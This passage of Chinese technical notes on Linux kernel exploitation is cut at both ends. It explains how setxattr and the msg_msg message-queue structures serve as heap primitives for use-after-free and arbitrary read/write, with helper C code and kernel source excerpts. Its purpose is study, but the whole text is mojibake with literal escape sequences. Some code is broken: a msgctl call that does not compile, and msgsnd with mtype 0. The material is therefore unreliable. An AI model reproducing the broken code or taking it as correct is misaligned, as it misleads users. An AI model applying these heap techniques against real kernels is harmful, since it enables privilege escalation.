error;\n}\n```\n\nå…³æ³¨ç‚¹åœ¨`kvmalloc`ã€`copy_from_user`ã€`kvfree`ã€‚\n\n`kvmalloc`ä¸­çš„sizeå¯æ§ï¼Œ`copy_from_user`ä¸­çš„valueå¯æ§\n\nä¹Ÿå°±æ˜¯è¯´å½“`freelist`ä¸­å­˜åœ¨æˆ‘ä»¬éœ€è¦ä¿®æ”¹çš„chunkï¼Œè€Œè¯¥chunkåˆæ˜¯æˆ‘ä»¬æ§åˆ¶çš„æŸä¸ªè®¾å¤‡å†…å­˜å—æ—¶ï¼Œ(é€šè¿‡double-freeæˆ–è€…UAFå®ç°)é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡`setxattr`æ¥å¯¹è¯¥è®¾å¤‡å†…å­˜è¿›è¡Œä»»æ„å†™ã€‚è™½ç„¶æœ€åä¼šé‡Šæ”¾ï¼Œä½†æ˜¯ä¹Ÿåªä¼šå½±å“å†…å­˜å—ä¸­å­˜æ”¾ä¸‹ä¸€ä¸ªchunkåœ°å€å¤„çš„å†…å®¹0x8ä¸ªå­—èŠ‚ï¼Œè€Œå½“æˆ‘ä»¬ç”¨ä¸ç€è¿™ä¸ªåœ°æ–¹çš„å†…å®¹æ—¶ï¼Œå°±ä¸ç”¨å¤ªå…³æ³¨äº†ã€‚\n\n##### ğŸ”ºæ³¨ï¼š\n\nä½¿ç”¨çš„æ—¶å€™éœ€è¦æ³¨æ„æŒ‡å®šä¸€ä¸ªå½“å‰çš„expç¨‹åºï¼Œç±»ä¼¼å¦‚ä¸‹ï¼Œç¬¬äºŒä¸ªå‚æ•°å­—ç¬¦ä¸²ä»»æ„ã€‚\n\n```C\nsetxattr(\"/tmp/ufdExp\", \"PIG-007\", &buf,0x100,0);\n```\n\n#### msg_msg\n\nè¿™ä¸ªä¸‹é¢æ–°åˆ›ä¸€ä¸ªç‚¹ï¼Œæ–¹ä¾¿æ ‡é¢˜è·³è½¬\n\n## 3.msg_msg\n\næ‰¿æ¥ä¸Šé¢çš„çŸ¥è¯†ç‚¹\n\nè¿™ä¸ªåœ¨ä¹‹å‰ä¹Ÿæ€»ç»“è¿‡ï¼Œä¸è¿‡æ€»ç»“å¾—æœ‰äº›é”™è¯¯ï¼Œä¹Ÿä¸å¤ªå®Œå–„ï¼Œè¿™é‡Œå†å¥½å¥½æ€»ç»“ä¸€ä¸‹\n\nä¿®æ”¹æ—¶é—´ï¼š`2022-05-12`\n\nå‚ç…§ï¼š[ã€NOTES.0x08ã€‘Linux Kernel Pwn IVï¼šé€šç”¨ç»“æ„ä½“ä¸æŠ€å·§ - arttnba3's blog](https://arttnba3.cn/2021/11/29/NOTE-0X08-LINUX-KERNEL-PWN-PART-IV/#åˆ†é…ï¼ˆGFP-KERNEL-ACCOUNTï¼‰ï¼šmsgsnd-ç³»ç»Ÿè°ƒç”¨)\n\n[Linuxå†…æ ¸ä¸­åˆ©ç”¨msg_msgç»“æ„å®ç°ä»»æ„åœ°å€è¯»å†™ - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)](https://www.anquanke.com/post/id/252558)\n\n[Linuxçš„è¿›ç¨‹é—´é€šä¿¡ - æ¶ˆæ¯é˜Ÿåˆ— Â· Poor Zorro's Linux Book (gitbooks.io)](https://zorro.gitbooks.io/poor-zorro-s-linux-book/content/linuxde-jin-cheng-jian-tong-xin-xiao-xi-dui-lie.html)\n\nã€ŠLinux/Unixç³»ç»Ÿç¼–ç¨‹æ‰‹å†Œã€‹\n\n### (1)ä½¿ç”¨æ–¹æ³•\n\n#### â‘ åˆ›å»º\n\n- é¦–å…ˆåˆ›å»º`queue_id`ç®¡ç†æ ‡å¿—ï¼Œå¯¹åº”äºå†…æ ¸ç©ºé—´çš„`msg_queue`ç®¡ç†ç»“æ„\n\n  ```c\n  //keyè¦ä¹ˆä½¿ç”¨ftok()ç®—æ³•ç”Ÿæˆ,è¦ä¹ˆæŒ‡å®šä¸ºIPC_PRIVATE\n  //ä»£è¡¨ç€è¯¥æ¶ˆæ¯é˜Ÿåˆ—åœ¨å†…æ ¸ä¸­å”¯ä¸€çš„æ ‡è¯†ç¬¦\n  //ä½¿ç”¨IPC_PRIVATEä¼šç”Ÿæˆå…¨æ–°çš„æ¶ˆæ¯é˜Ÿåˆ—IPCå¯¹è±¡\n  int32_t make_queue(key_t key, int msg_flag)\n  {\n      int32_t result;\n      if ((result = msgget(key, msg_flag)) == -1) \n      {\n          perror(\"msgget failure\");\n          exit(-1);\n      }\n      return result;\n  }\n  \n  int queue_id = make_queue(IPC_PRIVATE, 0666 | IPC_CREAT);\n  ```\n\n  ä½¿ç”¨ç®€å•å°è£…çš„`msgget`å‡½æ•°æˆ–è€…ç³»ç»Ÿè°ƒç”¨å·`__NR_msgget`ï¼Œä¹‹åä¿å­˜æ•°æ®çš„æ¶ˆæ¯å°±ä¼šåœ¨è¿™ä¸ª`queue_id`ç®¡ç†æ ‡å¿—ï¼Œä»¥åŠå†…æ ¸ç©ºé—´çš„`msg_queue`ç®¡ç†ç»“æ„ä¸‹è¿›è¡Œåˆ›å»º\n\n#### â‘¡æ•°æ®ä¼ è¾“\n\n- å†™å…¥æ¶ˆæ¯ï¼š\n\n  ç„¶åå°±å¯ä»¥ä¾æ®`queue_id`å†™å…¥æ¶ˆæ¯äº†ï¼Œä¸åŒäº`pipe`å’Œ`socketpair`ï¼Œè¿™ä¸ªéœ€è¦ç‰¹å®šçš„å°è£…å‡½æ•°ï¼ˆ`msgsnd/msgrcv`ï¼‰æˆ–è€…å¯¹åº”çš„ç³»ç»Ÿè°ƒç”¨ï¼ˆ`__NR_msgrcv/__NR_msgsnd`ï¼‰æ¥å®ç°ã€‚\n\n  ```c\n  typedef struct\n  {\n          long mtype;\n          char mtext[1];\n  }msgp;\n  \n  //msg_bufå®é™…ä¸Šä¸ºmsgp,é‡Œé¢åŒ…å«mtype,è¿™ä¸ªmtypeåœ¨åé¢çš„å †å—æ„é€ ä¸­å¾ˆæœ‰ç”¨\n  void send_msg(int msg_queue_id, void *msg_buf, size_t msg_size, int msg_flag)\n  {\n      if (msgsnd(msg_queue_id, msg_buf, msg_size, msg_flag) == -1)\n      {\n          perror(\"msgsend failure\");\n          exit(-1);\n      }\n      return;\n  }\n  \n  char queue_send_buf[0x2000];\n  m_ts_size = 0x400-0x30;//ä»»æ„æŒ‡å®š\n  msg *message = (msg *)queue_send_buf;\n  message->mtype = 0;\n  send_msg(queue_id, message, m_ts_size, 0);\n  ```\n\n- è¯»å–æ¶ˆæ¯ï¼š\n\n  ä¹‹åå³å¯ä¾æ®`queue_id`è¯»å–æ¶ˆæ¯\n\n  ```c\n  void get_msg(int msg_queue_id, void *msg_buf, size_t msg_size, long msgtyp, int msg_flag)\n  {\n      if (msgrcv(msg_queue_id, msg_buf, msg_size, msgtyp, msg_flag) < 0)\n      {\n          perror(\"msgrcv\");\n          exit(-1);\n      }\n      return;\n  }\n  \n  char queue_recv_buf[0x2000];\n  m_ts_size = 0x400-0x30;//ä»»æ„æŒ‡å®š\n  get_msg(queue_id, queue_recv_buf, m_ts_size, 0, IPC_NOWAIT | MSG_COPY);\n  ```\n\n- `mtype`\n\n  å¯é€šè¿‡è®¾ç½®è¯¥å€¼æ¥å®ç°ä¸åŒé¡ºåºçš„æ¶ˆæ¯è¯»å–ï¼Œåœ¨ä¹‹åçš„å †å—æ„é€ ä¸­å¾ˆæœ‰ç”¨\n\n  - åœ¨å†™å…¥æ¶ˆæ¯æ—¶ï¼ŒæŒ‡å®š`mtype`ï¼Œåç»­æ¥æ”¶æ¶ˆæ¯æ—¶å¯ä»¥ä¾æ®æ­¤`mtype`æ¥è¿›è¡Œéé¡ºåºæ¥æ”¶\n  - åœ¨è¯»å–æ¶ˆæ¯æ—¶ï¼ŒæŒ‡å®š`msgtyp`ï¼Œåˆ†ä¸ºå¦‚ä¸‹æƒ…å†µ\n    - `msgtyp`å¤§äº0ï¼šé‚£ä¹ˆåœ¨`find_msg`å‡½æ•°ä¸­ï¼Œå°±ä¼šå°†éå†å¯»æ‰¾æ¶ˆæ¯é˜Ÿåˆ—é‡Œçš„ç¬¬ä¸€æ¡ç­‰äº`msgtyp`çš„æ¶ˆæ¯ï¼Œç„¶åè¿›è¡Œåç»­æ“ä½œã€‚\n    - `msgtyp`ç­‰äº0ï¼šå³ç±»ä¼¼äºé¡ºåºè¯»å–ï¼Œ`find_msg`å‡½æ•°ä¼šç›´æ¥è·å–åˆ°æ¶ˆæ¯é˜Ÿåˆ—é¦–ä¸ªæ¶ˆæ¯ã€‚\n    - `msgtyp`å°äº0ï¼šä¼šå°†ç­‰å¾…çš„æ¶ˆæ¯å½“æˆä¼˜å…ˆé˜Ÿåˆ—æ¥å¤„ç†ï¼Œ`mtype`çš„å€¼è¶Šå°ï¼Œå…¶ä¼˜å…ˆçº§è¶Šé«˜ã€‚\n\n- `msg_flag`\n\nå¯ä»¥å…³æ³¨ä¸€ä¸‹`MSG_NOERROR`æ ‡å¿—ä½ï¼Œæ¯”å¦‚è¯´`msg_flag`æ²¡æœ‰è®¾ç½®`MSG_NOERROR`çš„æ—¶å€™ï¼Œé‚£ä¹ˆæƒ…å†µå¦‚ä¸‹ï¼š\n\nå‡å®šè·å–æ¶ˆæ¯æ—¶è¾“å…¥çš„é•¿åº¦`m_ts_size`ä¸º`0x200`ï¼Œä¸”è¿™ä¸ªé•¿åº¦å¤§äºé€šè¿‡`find_msg()`å‡½æ•°è·å–åˆ°çš„æ¶ˆæ¯é•¿åº¦`0x200`ï¼Œåˆ™å¯ä»¥é¡ºåˆ©è¯»å–ï¼Œå¦‚æœè¯¥é•¿åº¦å°äºè·å–åˆ°çš„æ¶ˆæ¯é•¿åº¦`0x200`ï¼Œåˆ™ä¼šå‡ºç°å¦‚ä¸‹é”™è¯¯\n\n![](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220511193452872.png)\n\nä½†æ˜¯å¦‚æœè®¾ç½®äº†`MSG_NOERROR`ï¼Œé‚£ä¹ˆå³ä½¿ä¼ å…¥æ¥æ”¶æ¶ˆæ¯çš„é•¿åº¦å°äºè·å–åˆ°çš„æ¶ˆæ¯é•¿åº¦ï¼Œä»ç„¶å¯ä»¥é¡ºåˆ©è·å–ï¼Œä½†æ˜¯å¤šä½™çš„æ¶ˆæ¯ä¼šè¢«æˆªæ–­ï¼Œç›¸å…³å†…å­˜è¿˜æ˜¯ä¼šè¢«é‡Šæ”¾ï¼Œè¿™ä¸ªåœ¨æºä»£ç ä¸­ä¹Ÿæœ‰æ‰€ä½“ç°ã€‚\n\n```c\n//v5.11 /ipc/msg.c do_msgrcvå‡½æ•°ä¸­\nif ((bufsz < msg->m_ts) && !(msgflg & MSG_NOERROR)) {\n    msg = ERR_PTR(-E2BIG);\n    goto out_unlock0;\n}\n```\n\næ­¤å¤–è¿˜æœ‰æ›´å¤šçš„`msg_flag`ï¼Œå°±ä¸ä¸€ä¸€ä¸¾ä¾‹äº†ã€‚\n\n#### â‘¢é‡Šæ”¾\n\nè¿™ä¸ªä¸»è¦æ˜¯ç”¨åˆ°`msgctl`å°è£…å‡½æ•°æˆ–è€…`__NR_msgctl`ç³»ç»Ÿè°ƒç”¨ï¼Œç›´æ¥é‡Šæ”¾æ‰æ‰€æœ‰çš„æ¶ˆæ¯ç»“æ„ï¼ŒåŒ…æ‹¬ç”³è¯·çš„`msg_queue`çš„ç»“æ„\n\n```c\n//å…¶ä¸­IPC_RMIDè¿™ä¸ªcmdå‘½ä»¤ä»£è¡¨é‡Šæ”¾æ‰è¯¥æ¶ˆæ¯é˜Ÿåˆ—çš„æ‰€æœ‰æ¶ˆæ¯,å„ç§å†…å­˜ç»“æ„ä½“ç­‰\nif(msgctl(queue_id),IPC_RMID,NULL)==-1)\n{\n    perror(\"msgctl\");\n    exit(-1);\n}\n```\n\nä¸è¿‡ä¸€èˆ¬ä¹Ÿç”¨ä¸åˆ°ï¼Œå¯èƒ½æŸäº›åˆå¹¶objçš„æƒ…å†µèƒ½ç”¨åˆ°?\n\næ­¤å¤–è¿˜æœ‰æ›´å¤šçš„`cmd`å‘½ä»¤ï¼Œå¸¸ç”¨æ¥è®¾ç½®å†…æ ¸ç©ºé—´çš„`msg_queue`ç»“æ„ä¸Šçš„ç›¸å…³æ•°æ®ï¼Œä¸è¿‡å¤šä»‹ç»äº†ã€‚\n\n#### æ€»ç»“\n\næ€»ç»“ä¸€ä¸‹å¤§è‡´çš„ä½¿ç”¨æ–¹æ³•å¦‚ä¸‹\n\n```c\ntypedef struct\n{\n        long mtype;\n        char mtext[1];\n}msgp;\n\nint32_t make_queue(key_t key, int msg_flag)\n{\n    int32_t result;\n    if ((result = msgget(key, msg_flag)) == -1) \n    {\n        perror(\"msgget failure\");\n        exit(-1);\n    }\n    return result;\n}\n\n\n\nvoid get_msg(int msg_queue_id, void *msg_buf, size_t msg_size, long msgtyp, int msg_flag)\n{\n    if (msgrcv(msg_queue_id, msg_buf, msg_size, msgtyp, msg_flag) < 0)\n    {\n        perror(\"msgrcv\");\n        exit(-1);\n    }\n    return;\n}\n\nvoid send_msg(int msg_queue_id, void *msg_buf, size_t msg_size, int msg_flag)\n{\n    if (msgsnd(msg_queue_id, msg_buf, msg_size, msg_flag) == -1)\n    {\n        perror(\"msgsend failure\");\n        exit(-1);\n    }\n    return;\n}\n\n\nint main()\n{\n    int queue_id, m_ts_size;\n    char queue_recv_buf[0x2000];\n    char queue_send_buf[0x2000];\n    \n    m_ts_size = 0x400-0x30;\n    msgp *message = (msgp *)queue_send_buf;\n    message->mtype = 0;\n    \n    memset(message->mtext,'\\xaa', m_ts_size);\n    memset(queue_recv_buf, '\\xbb', sizeof(queue_recv_buf));\n    \n    queue_id = make_queue(IPC_PRIVATE, 0666 | IPC_CREAT);\n    send_msg(queue_id, message, m_ts_size, 0);\n    get_msg(queue_id, queue_recv_buf, m_ts_size, 0, IPC_NOWAIT | MSG_COPY);\n    \n    return 0;\n}\n```\n\n### (2)å†…å­˜åˆ†é…ä¸é‡Šæ”¾\n\n#### â‘ åˆ›å»º\n\n##### A.å†…å­˜ç”³è¯·\n\n- è¿˜æ˜¯éœ€è¦å…ˆåˆ›å»º`msg_queue`ç»“æ„ä½“ï¼Œä½¿ç”¨`msgget`å‡½æ•°ï¼Œè°ƒç”¨é“¾ä¸º\n\n  ```\n  msgget(key,msg_flag)->ksys_msgget()->ipcget()->ipcget_new()->newque()\n  ```\n\n  ä¸»è¦è¿˜æ˜¯å…³æ³¨æœ€åçš„`newque()`å‡½æ•°ï¼Œåœ¨è¯¥å‡½æ•°ä¸­ä½¿ç”¨`kvmalloc()`ç”³è¯·å †å—ï¼Œå¤§å°ä¸º0x100ï¼Œå±äº`kmalloc-256`ï¼Œ(ä¸åŒç‰ˆæœ¬å¤§å°è²Œä¼¼ä¸åŒ)ã€‚\n\n  ```c\n  //v5.11 /ipc/msg.c\n  static int newque(struct ipc_namespace *ns, struct ipc_params *params)\n  {\n  \tstruct msg_queue *msq;\n  \tint retval;\n  \tkey_t key = params->key;\n  \tint msgflg = params->flg;\n  \n      //è¿™ä¸ªæ‰æ˜¯å®é™…ç”³è¯·çš„å †å—å†…å­˜\n  \tmsq = kvmalloc(sizeof(*msq), GFP_KERNEL);\n  \tif (unlikely(!msq))\n  \t\treturn -ENOMEM;\n  \n  \tmsq->q_perm.mode = msgflg & S_IRWXUGO;\n  \tmsq->q_perm.key = key;\n  \n  \tmsq->q_perm.security = NULL;\n      //è¿›è¡Œç›¸å…³æ³¨å†Œ\n  \tretval = security_msg_queue_alloc(&msq->q_perm);\n  \tif (retval) {\n  \t\tkvfree(msq);\n  \t\treturn retval;\n  \t}\n  \n      //åˆå§‹åŒ–\n  \tmsq->q_stime = msq->q_rtime = 0;\n  \tmsq->q_ctime = ktime_get_real_seconds();\n  \tmsq->q_cbytes = msq->q_qnum = 0;\n  \tmsq->q_qbytes = ns->msg_ctlmnb;\n  \tmsq->q_lspid = msq->q_lrpid = NULL;\n  \tINIT_LIST_HEAD(&msq->q_messages);\n  \tINIT_LIST_HEAD(&msq->q_receivers);\n  \tINIT_LIST_HEAD(&msq->q_senders);\n  \n      //ä¸‹é¢ä¸€å †çœ‹ä¸æ‡‚åœ¨å¹²å•¥\n  \t/* ipc_addid() locks msq upon success. */\n  \tretval = ipc_addid(&msg_ids(ns), &msq->q_perm, ns->msg_ctlmni);\n  \tif (retval < 0) {\n  \t\tipc_rcu_putref(&msq->q_perm, msg_rcu_free);\n  \t\treturn retval;\n  \t}\n  \tipc_unlock_object(&msq->q_perm);\n  \trcu_read_unlock();\n  \n  \treturn msq->q_perm.id;\n  }\n  ```\n\n  åˆ›å»ºçš„ç»“æ„ä½“å¦‚ä¸‹æ‰€ç¤º\n\n  ```c\n  //v5.11 /ipc/msg.c\n  struct msg_queue {\n      //è¿™äº›ä¸ºä¸€äº›ç›¸å…³ä¿¡æ¯\n  \tstruct kern_ipc_perm q_perm;\n  \ttime64_t q_stime;\t\t/* last msgsnd time */\n  \ttime64_t q_rtime;\t\t/* last msgrcv time */\n  \ttime64_t q_ctime;\t\t/* last change time */\n  \tunsigned long q_cbytes;\t\t/* current number of bytes on queue */\n  \tunsigned long q_qnum;\t\t/* number of messages in queue */\n  \tunsigned long q_qbytes;\t\t/* max number of bytes on queue */\n  \tstruct pid *q_lspid;\t\t/* pid of last msgsnd */\n  \tstruct pid *q_lrpid;\t\t/* last receive pid */\n  \n      //å­˜æ”¾msg_msgç›¸å…³æŒ‡é’ˆnextã€prev,æ¯”è¾ƒé‡è¦,é€šå¸¸æ‹¿æ¥æº¢å‡ºåˆ¶é€ UAF\n      //å’Œè¯¥æ¶ˆæ¯é˜Ÿåˆ—é‡Œçš„æ‰€æœ‰æ¶ˆæ¯ç»„æˆåŒå‘å¾ªç¯é“¾è¡¨\n  \tstruct list_head q_messages;\n  \tstruct list_head q_receivers;\n  \tstruct list_head q_senders;\n  } __randomize_layout;\n  \n  ```\n\n- æ¥ç€å½“ä½¿ç”¨`msgsnd`å‡½æ•°ä¼ é€’æ¶ˆæ¯æ—¶ï¼Œä¼šåˆ›å»ºæ–°çš„`msg_msg`ç»“æ„ä½“ï¼Œæ¶ˆæ¯è¿‡é•¿çš„è¯å°±ä¼šåˆ›å»ºæ›´å¤šçš„`msg_msgseg`æ¥å­˜å‚¨æ›´å¤šçš„æ¶ˆæ¯ã€‚ç›¸å…³çš„å‡½æ•°è°ƒç”¨é“¾å¦‚ä¸‹ï¼š\n\n  ```c\n  msgsnd(msg_queue_id, msg_buf, msg_size, msg_flag)->do_msgsnd()->load_msg()->alloc_msg()\n  ```\n\n  ä¸»è¦è¿˜æ˜¯å…³æ³¨åœ¨`alloc_msg()`å‡½æ•°\n\n  ```c\n  //v5.11 /ipc/msgutil.c\n  static struct msg_msg *alloc_msg(size_t len)\n  {\n  \tstruct msg_msg *msg;\n  \tstruct msg_msgseg **pseg;\n  \tsize_t alen;\n  \n      //æœ€å¤§å‘é€DATALEN_MSGé•¿åº¦çš„æ¶ˆæ¯\n      //#define DATALEN_MSG\t((size_t)PAGE_SIZE-sizeof(struct msg_msg))\n      //è¿™é‡Œçš„PAGE_SIZEä¸º0x400,å³æœ€å¤škmalloc-\n  \talen = min(len, DATALEN_MSG);\n      //ä½¿ç”¨æ­£å¸¸\n  \tmsg = kmalloc(sizeof(*msg) + alen, GFP_KERNEL_ACCOUNT);\n  \tif (msg == NULL)\n  \t\treturn NULL;\n  \n      //å¦‚æœä¼ å…¥æ¶ˆæ¯é•¿åº¦è¶…è¿‡0x400-0x30,å°±å†è¿›è¡Œç”³è¯·msg_msgsegã€‚\n      //ä½¿ç”¨kmallocç”³è¯·,æ ‡å¿—ä¸ºGFP_KERNEL_ACCOUNTã€‚\n      //æœ€å¤§ä¹Ÿä¸º0x400,ä¹Ÿå±äºkmalloc-1024\n      //è¿˜æœ‰å†é•¿çš„æ¶ˆæ¯,å°±å†ç”³è¯·msg_msgseg\n  \tmsg->next = NULL;\n  \tmsg->security = NULL;\n  \tlen -= alen;\n  \tpseg = &msg->next;\n  \twhile (len > 0) {\n  \t\tstruct msg_msgseg *seg;\n  \t\t//ä¸çŸ¥é“å¹²å•¥çš„\n  \t\tcond_resched();\n  \n  \t\talen = min(len, DATALEN_SEG);\n  \t\tseg = kmalloc(sizeof(*seg) + alen, GFP_KERNEL_ACCOUNT);\n          //ç”³è¯·å®Œä¹‹å,å°†msg_msgsegæ”¾åˆ°msg->nextè¿™ä¸ªå•å‘é“¾è¡¨ä¸Š\n  \t\tif (seg == NULL)\n  \t\t\tgoto out_err;\n  \t\t*pseg = seg;\n  \t\tseg->next = NULL;\n  \t\tpseg = &seg->next;\n  \t\tlen -= alen;\n  \t}\n  \n  \treturn msg;\n  \n  out_err:\n  \tfree_msg(msg);\n  \treturn NULL;\n  }\n  ```\n\n  - `msg_msg`ç»“æ„ä½“å¦‚ä¸‹ï¼Œå¤´éƒ¨å¤§å°`0x30`\n\n    ```c\n    //v5.11 /include/linux/msg.h\n    struct msg_msg {\n    \tstruct list_head m_list;//ä¸msg_queueæˆ–è€…å…¶ä»–çš„msg_msgç»„æˆåŒå‘å¾ªç¯é“¾è¡¨\n    \tlong m_type;\n    \tsize_t m_ts;\t\t/* message text size */\n    \tstruct msg_msgseg *next;//å•å‘é“¾è¡¨ï¼ŒæŒ‡å‘è¯¥æ¡ä¿¡æ¯åé¢çš„msg_msgseg\n    \tvoid *security;\n    \t/* the actual message follows immediately */\n    };\n    ```\n\n    å¦‚ä¸‹æ‰€ç¤º\n\n    <img src=\"https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220511220130886.png\" alt=\"image-20220511220130886\" style=\"zoom:80%;\" />\n\n  - `msg_msgseq`ç»“æ„å¦‚ä¸‹ï¼Œåªæ˜¯ä¸€ä¸ª`struct msg_msgseg*`æŒ‡é’ˆ\n\n    ```c\n    //v5.11 /ipc/msgutil.c\n    struct msg_msgseg {\n    \tstruct msg_msgseg *next;\n    \t/* the next part of the message follows immediately */\n    };\n    ```\n\n    å¦‚ä¸‹æ‰€ç¤º\n\n    <img src=\"https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220511220627775.png\" alt=\"image-20220511220627775\" style=\"zoom:80%;\" />\n\n###### ç›¸å…³å†…å­˜ç»“æ„ï¼š\n\nåœ¨ä¸€ä¸ª`msg_queue`é˜Ÿåˆ—ä¸‹ï¼Œæ¶ˆæ¯é•¿åº¦ä¸º`0x1000-0x30-0x8-0x8-0x8`\n\n- ä¸€æ¡æ¶ˆæ¯ï¼š\n\n  ![image-20220511231539231](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220511231539231.png)\n\n- ä¸¤æ¡æ¶ˆæ¯ï¼š\n\n  ä»¥`msg_queue`çš„`struct list_head q_messages;`åŸŸä¸ºé“¾è¡¨å¤´ï¼Œå’Œ`msg_msg`ç»“æ„çš„`struct list_head m_list`åŸŸä¸²è”æ‰€æœ‰çš„`msg_msg`å½¢æˆåŒå‘å¾ªç¯é“¾è¡¨\n\n  ![æœªå‘½åæ–‡ä»¶](https://pig-007.oss-cn-beijing.aliyuncs.com/img/%E6%9C%AA%E5%91%BD%E5%90%8D%E6%96%87%E4%BB%B6.png)\n\nåŒç†ï¼ŒåŒä¸€ä¸ª`msg_queue`æ¶ˆæ¯é˜Ÿåˆ—ä¸‹çš„å¤šæ¡æ¶ˆæ¯ä¹Ÿæ˜¯ç±»ä¼¼çš„\n\n###### å†…å­˜ç”³è¯·æ€»ç»“ï¼š\n\n- ä½¿ç”¨`msgget()`å‡½æ•°åˆ›å»ºå†…æ ¸ç©ºé—´çš„æ¶ˆæ¯é˜Ÿåˆ—ç»“æ„`msg_msgseg`ï¼Œè¿”å›å€¼ä¸ºæ¶ˆæ¯é˜Ÿåˆ—çš„`id`æ ‡å¿—`queue_id`\n  - `msg_msgseg`ç®¡ç†æ•´ä¸ªæ¶ˆæ¯é˜Ÿåˆ—ï¼Œå¤§å°ä¸º0x100ï¼Œ`kmalloc-256`ã€‚\n  - å…¶`struct list_head q_messages;`åŸŸä¸ºé“¾è¡¨å¤´ï¼Œå’Œ`msg_msg`ç»“æ„çš„`struct list_head m_list`åŸŸä¸²è”æ‰€æœ‰çš„`msg_msg`å½¢æˆåŒå‘å¾ªç¯é“¾è¡¨\n- æ¯æ¬¡åœ¨è¯¥æ¶ˆæ¯é˜Ÿåˆ—`queue_id`ä¸‹è°ƒç”¨`msgsnd()`å‡½æ•°éƒ½ä¼šç”³è¯·å†…æ ¸ç©ºé—´çš„`msg_msg`ç»“æ„ï¼Œæ¶ˆæ¯é•¿åº¦å¤§äº`0x400-0x30`å°±ä¼šç”³è¯·å†…æ ¸ç©ºé—´çš„`msg_msgseg`ç»“æ„\n  - `msg_msg`ä¸ºæ¯æ¡æ¶ˆæ¯å­˜æ”¾æ¶ˆæ¯æ•°æ®çš„ç»“æ„ï¼Œä¸`msg_queue`å½¢æˆåŒå‘å¾ªç¯é“¾è¡¨ï¼Œä¸`msg_msgseg`å½¢æˆå•å‘é“¾è¡¨å¤§å°æœ€å¤§ä¸º0x400ï¼Œå±äº`kmalloc-64`è‡³`kmalloc-1024`\n  - `msg_msgseg`ä¹Ÿä¸ºæ¯æ¡æ¶ˆæ¯å­˜æ”¾æ¶ˆæ¯æ•°æ®çš„ç»“æ„ï¼ŒæŒ‚åœ¨`msg_msg`å•å‘é“¾è¡¨ä¸­ï¼Œå¤§å°æœ€å¤§ä¸º`0x400`ï¼Œå±äº`kmalloc-16`è‡³`kmalloc-1024`ï¼Œå½“æ¶ˆæ¯é•¿åº¦å¾ˆé•¿æ—¶å°±ä¼šç”³è¯·å¾ˆå¤šçš„å†…æ ¸ç©ºé—´çš„`msg_msgseg`ç»“æ„ã€‚\n\n\n\n##### B.æ•°æ®å¤åˆ¶\n\nè°ƒç”¨å®Œ`alloc_msg()`å‡½æ•°åï¼Œå›åˆ°`load_msg()`å‡½æ•°æ¥ç€è¿›è¡Œæ•°æ®å¤åˆ¶ï¼Œå‡½æ•°è¿˜æ˜¯æŒºç®€å•çš„ã€‚\n\n```c\nstruct msg_msg *load_msg(const void __user *src, size_t len)\n{\n\tstruct msg_msg *msg;\n\tstruct msg_msgseg *seg;\n\tint err = -EFAULT;\n\tsize_t alen;\n\n\tmsg = alloc_msg(len);\n\tif (msg == NULL)\n\t\treturn ERR_PTR(-ENOMEM);\n\n    //å…ˆå¤åˆ¶è¿›msg_msgä¸­å­˜æ”¾æ¶ˆæ¯çš„éƒ¨åˆ†\n\talen = min(len, DATALEN_MSG);\n\tif (copy_from_user(msg + 1, src, alen))\n\t\tgoto out_err;\n\n    //éå†msg_msgä¸‹çš„msg_msgseg,é€ä¸ªå­˜æ”¾æ•°æ®è¿›å»\n\tfor (seg = msg->next; seg != NULL; seg = seg->next) {\n\t\tlen -= alen;\n\t\tsrc = (char __user *)src + alen;\n\t\talen = min(len, DATALEN_SEG);\n\t\tif (copy_from_user(seg + 1, src, alen))\n\t\t\tgoto out_err;\n\t}\n\n\terr = security_msg_msg_alloc(msg);\n\tif (err)\n\t\tgoto out_err;\n\n\treturn msg;\n\nout_err:\n\tfree_msg(msg);\n\treturn ERR_PTR(err);\n}\n```\n\n\n\n#### â‘¡é‡Šæ”¾\n\nç›¸å…³çš„å‡½æ•°è°ƒç”¨é“¾\n\n```\nmsgrcv(msg_queue_id, msg_buf, msg_size, msgtyp, msg_flag)->SYS_msgrcv()->ksys_msgrcv()->do_msgrcv()->do_msg_fill()->store_msg()\n```\n\né¦–å…ˆå…³æ³¨ä¸€ä¸‹`do_msgrcv()`å‡½æ•°ï¼Œé‡Œé¢å¾ˆå¤šä¸œè¥¿éƒ½æ¯”è¾ƒé‡è¦\n\n```c\nstatic long do_msgrcv(int msqid, void __user *buf, size_t bufsz, long msgtyp, int msgflg,\n                      long (*msg_handler)(void __user *, struct msg_msg *, size_t))\n{\n    int mode;\n    struct msg_queue *msq;\n    struct ipc_namespace *ns;\n    struct msg_msg *msg, *copy = NULL;\n    DEFINE_WAKE_Q(wake_q);\n    //....\n    if (msqid < 0 || (long) bufsz < 0)\n        return -EINVAL;\n    //è®¾ç½®äº†MSG_COPYæ ‡å¿—ä½å°±ä¼šå‡†å¤‡ä¸€ä¸ªmsg_msgçš„å‰¯æœ¬copy,é€šå¸¸ç”¨æ¥é˜²æ­¢unlink\n    if (msgflg & MSG_COPY) {\n        //ä»è¿™é‡Œå¯ä»¥çœ‹å‡º,åŒæ ·ä¹Ÿéœ€è¦è®¾ç½®IPC_NOWAITæ ‡å¿—ä½æ‰ä¸ä¼šå‡ºé”™\n        if ((msgflg & MSG_EXCEPT) || !(msgflg & IPC_NOWAIT))\n            return -EINVAL;\n        //è¿™ä¸ªprepare_copy()å‡½æ•°å†…éƒ¨è°ƒç”¨äº†load_msg()å‡½æ•°æ¥åˆ›å»ºä¸€ä¸ªæ–°çš„msg_msg/msg_msgseg\n        //ä¼ å…¥çš„sizeå‚æ•°ä¸ºbufsz,å°±ç”¨æˆ·ç©ºé—´å®é™…éœ€è¦æ¶ˆæ¯çš„é•¿åº¦,é‚£ä¹ˆç”³è¯·çš„å †å—é•¿åº¦å°±å¯å˜äº†\n        //ä¸ä¸€å®šæ˜¯è¿™æ¡æ¶ˆæ¯çš„é•¿åº¦,è€Œæ˜¯ç”±æˆ‘ä»¬ç›´æ¥æ§åˆ¶,è™½ç„¶æœ€åä¹Ÿä¼šé‡Šæ”¾æ‰\n        copy = prepare_copy(buf, min_t(size_t, bufsz, ns->msg_ctlmax));\n        /*\n        static inline struct msg_msg *prepare_copy(void __user *buf, size_t bufsz)\n        {\n            struct 